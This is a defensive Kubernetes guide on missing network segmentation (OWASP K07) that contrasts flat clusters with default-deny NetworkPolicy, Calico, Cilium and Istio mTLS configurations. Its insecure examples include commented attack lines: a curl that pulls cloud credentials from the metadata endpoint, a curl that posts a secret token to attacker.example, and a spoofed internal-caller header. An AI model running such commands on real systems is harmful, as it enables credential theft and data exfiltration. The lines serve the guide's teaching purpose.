# K07: Missing Network Segmentation Controls - Examples

Each pair below shows an **insecure** (default-allow / flat) configuration and the **secure** version. The examples focus on what dominates real K07 findings: no default-deny baseline, no namespace isolation, unrestricted egress to the metadata endpoint, and no service identity.

## 1. Default-Allow vs. Default-Deny Baseline

### Insecure — No Policy (Flat Network)
```
# There is simply no NetworkPolicy in the namespace.
$ kubectl get networkpolicy -n app-prod
No resources found in app-prod namespace.

# Result: every pod can reach every pod, every namespace, the metadata
# endpoint, and the internet. A single compromised pod reaches everything.
```

### Secure — Default-Deny Ingress and Egress
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: app-prod
spec:
  podSelector: {}              # selects EVERY pod in the namespace
  policyTypes:
    - Ingress
    - Egress                    # critical: deny egress, not just ingress
  # no rules => deny everything in both directions
---
# DNS must be explicitly allowed back, or name resolution breaks:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns-egress
  namespace: app-prod
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
    - to:
        - namespaceSelector:
            matchLabels: { kubernetes.io/metadata.name: kube-system }
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
```

**Why it matters**: Policies are additive and allow-only. Without this deny-all baseline, any pod not explicitly selected by another policy stays fully open. Deny-all first, then allow-list, is the pattern that actually segments a cluster.

## 2. Exposed Datastore vs. Scoped Ingress

### Insecure — Database Reachable From Any Pod
```
# No policy protects the database. Any pod in any namespace can connect:
#   psql postgres://app:pw@orders-db.app-prod.svc:5432/prod
# A compromised frontend pod talks straight to the DB.
```

### Secure — Only the API Tier May Reach the DB
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ordersdb-ingress
  namespace: app-prod
spec:
  podSelector:
    matchLabels: { app: orders-db }     # this policy protects orders-db
  policyTypes: [Ingress]
  ingress:
    - from:
        - podSelector:
            matchLabels: { app: orders-api }   # ONLY orders-api may connect
      ports:
        - { protocol: TCP, port: 5432 }
  # every other source (frontend, other namespaces) is denied
```

**Why it matters**: The datastore is now reachable only from its intended caller on its one port. A compromise of the frontend or any other pod no longer grants direct database access.

## 3. Flat Namespaces vs. Namespace Isolation

### Insecure — Namespaces Freely Reachable
```
# team-a and team-b share a cluster with no policy between them.
# From a pod in team-a:
#   curl http://orders-api.team-b.svc.cluster.local/internal/dump
# succeeds — namespaces are a naming boundary, not a network boundary.
```

### Secure — Same-Namespace-Only Ingress
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: same-namespace-only
  namespace: team-a
spec:
  podSelector: {}
  policyTypes: [Ingress]
  ingress:
    - from:
        - podSelector: {}     # empty selector = pods in THIS namespace only
---
# Cross-namespace access must be explicit and labeled (e.g. shared gateway):
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-ingress-gateway
  namespace: team-a
spec:
  podSelector:
    matchLabels: { app: web }
  policyTypes: [Ingress]
  ingress:
    - from:
        - namespaceSelector:
            matchLabels: { purpose: ingress-gateway }
      ports:
        - { protocol: TCP, port: 8080 }
```

**Why it matters**: Cross-tenant and cross-environment pivots are blocked unless a connection is explicitly, visibly allowed. Label namespaces consistently so `namespaceSelector` rules match reliably.

## 4. Unrestricted Egress vs. Egress Control (Metadata Blocked)

### Insecure — Pods Can Reach Anything Outbound
```
# No egress policy. From any pod:
#   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
#     -> node cloud credentials
#   curl -X POST https://attacker.example/c2 -d @/etc/secrets/token
#     -> command-and-control + exfiltration
# SSRF or any in-pod foothold becomes cloud-credential theft.
```

### Secure — Allow External but Exclude Metadata and Internal Ranges
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: egress-external-except-metadata
  namespace: app-prod
spec:
  podSelector:
    matchLabels: { app: fetcher }    # only pods that must call out
  policyTypes: [Egress]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32    # cloud metadata / IMDS — always block
              - 169.254.0.0/16        # link-local
              - 10.0.0.0/8            # private ranges
              - 172.16.0.0/12
              - 192.168.0.0/16
      ports:
        - { protocol: TCP, port: 443 }
```

```yaml
# Or block metadata cluster-wide with Calico (one object, all pods):
apiVersion: projectcalico.org/v3
kind: GlobalNetworkPolicy
metadata:
  name: deny-metadata
spec:
  order: 100
  selector: all()
  types: [Egress]
  egress:
    - action: Deny
      destination:
        nets: [169.254.169.254/32]
    - action: Allow
```

**Why it matters**: Egress control is what breaks the SSRF-to-metadata and exfiltration chains. Pair it with IMDSv2 (restricted hop limit) and a least-privilege node/workload IAM identity so stolen credentials are minimally useful.

## 5. No Identity vs. Service Mesh mTLS (Cilium / Istio)

### Insecure — Network Position Treated as Trust
```
# orders trusts anything that can route to it — no authentication of the caller:
#   curl http://orders.app-prod.svc/internal/refund -H "X-Internal-Caller: billing"
# Any compromised pod can impersonate "billing".
```

### Secure — Identity-Aware Policy (Cilium L7)
```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: orders-allow-api-l7
  namespace: app-prod
spec:
  endpointSelector:
    matchLabels: { app: orders }
  ingress:
    - fromEndpoints:
        - matchLabels: { app: orders-api }   # identity, not just IP
      toPorts:
        - ports:
            - { port: "8080", protocol: TCP }
          rules:
            http:
              - method: POST
                path: /internal/refund       # restrict even the HTTP path
```

### Secure — Enforce mTLS Everywhere (Istio)
```yaml
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata:
  name: default
  namespace: app-prod
spec:
  mtls:
    mode: STRICT        # reject any non-mTLS (unidentified) traffic
---
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: orders-allow-api
  namespace: app-prod
spec:
  selector:
    matchLabels: { app: orders }
  action: ALLOW
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/app-prod/sa/orders-api"]
```

**Why it matters**: mTLS gives every workload a cryptographic identity, so policy expresses *who* is calling rather than *where* they sit. This closes the impersonation gap that IP-based rules cannot, and encrypts east-west traffic against sniffing. **Linkerd** provides automatic mTLS between meshed pods with minimal configuration as an alternative.

## What Changed, and Why

| Control | Insecure (flat / default-allow) | Secure (default-deny + allow-list) |
|---------|----------------------------------|-------------------------------------|
| Baseline | No policy; everything reachable | Deny-all ingress + egress per namespace |
| Datastores | Reachable from any pod | Ingress scoped to the intended caller/port |
| Namespaces | Freely cross-reachable | Same-namespace-only; explicit labeled exceptions |
| Egress | Internet + `169.254.169.254` open | Metadata blocked, external destinations limited |
| Identity | Network position = trust | mTLS identity + L7 authorization (mesh/CNI) |

## A Note on CNI Choice

None of the secure examples above do anything unless the CNI enforces policy. Confirm enforcement before relying on these manifests:
- **Calico** — enforces `NetworkPolicy` and adds `GlobalNetworkPolicy` and ordered tiers for cluster-wide rules (e.g. the metadata deny above).
- **Cilium** — eBPF-based; enforces `NetworkPolicy` and adds identity-aware, L7-capable `CiliumNetworkPolicy` plus Hubble flow visibility.
- **Verify** — apply a deny-all, then confirm a previously working connection is now refused. If it still succeeds, the CNI is not enforcing policy and the cluster remains flat.

## Next Steps

- **[Prevention](prevention.md)**: The full default-deny + egress + mesh strategy
- **[Attack Vectors](attack-vectors.md)**: How a flat cluster is pivoted end to end
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
